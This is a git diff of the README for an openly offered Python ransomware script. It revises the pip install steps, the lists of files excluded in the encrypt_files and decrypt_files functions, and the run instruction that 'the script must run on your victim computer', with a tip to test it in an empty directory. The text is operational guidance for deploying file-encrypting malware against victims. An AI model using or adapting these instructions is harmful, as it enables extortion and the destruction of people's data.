@@ -53,7 +53,7 @@ If you want to convert the .py file into a `.exe` file its possible ! Using [pyi
 ## Installation Windows
 ![Logo](https://i.ibb.co/tJBNv9x/Screenshot-2022-05-24-at-8-07-34-PM.png)
 
-In order to be able to install all the dependencies you will need to have `pip` installed and run the commands below. If you are on **windows** run the `install.bat` file and the installation will be done automatically
+In order to be able to install all the dependencies you will need to have `pip` installed and run the commands below. If you are on **windows** run one of the following commands :
 
 ```bash
   pip3 install -r requirements.txt or pip install -r requirements.txt
@@ -103,11 +103,11 @@ But in the case you want to encrypt all victim's files, don't touch anything.
 ```
 ```python
     # In the encrypt_files function
-    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'install.bat' or file == 'ADD YOUR FILE NAME HERE':
+    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py' or file == 'ADD YOUR FILE NAME HERE':
 ```
 ```python
     # In the decrypt_files function
-    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'install.bat' or file == 'ADD YOUR FILE NAME HERE':
+    if file == 'ransomware.py' or file == 'rkey.key' or file == 'encryptionCheck.txt' or file == 'requirements.txt' or file == 'setup.py' or file == 'ADD YOUR FILE NAME HERE':
 ```
     
 ## Running Scripts
@@ -116,7 +116,7 @@ But in the case you want to encrypt all victim's files, don't touch anything.
 
 To be able to execute the files you will have to run these commands
 
-The script must be run on your victim computer.
+The script must run on your victim computer, or if you want to try you can ! but in a empty directory to avoid the encryption of all your files.
 ```python
   python3 ransomware.py
 ```
